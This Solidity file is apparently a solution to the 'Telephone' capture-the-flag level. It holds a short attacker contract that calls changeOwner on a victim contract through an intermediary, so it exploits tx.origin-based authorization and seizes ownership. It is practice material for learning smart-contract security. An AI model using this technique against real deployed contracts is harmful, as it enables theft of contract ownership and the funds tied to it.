// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/access/Ownable.sol";

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract ContractCaller is Ownable {

  ITelephone public immutable telephoneContract;

  constructor(address _telephoneContractAddress) public {
    telephoneContract = ITelephone(_telephoneContractAddress);
  }

  function callVictimContract() external onlyOwner {
    telephoneContract.changeOwner(msg.sender);
  }
}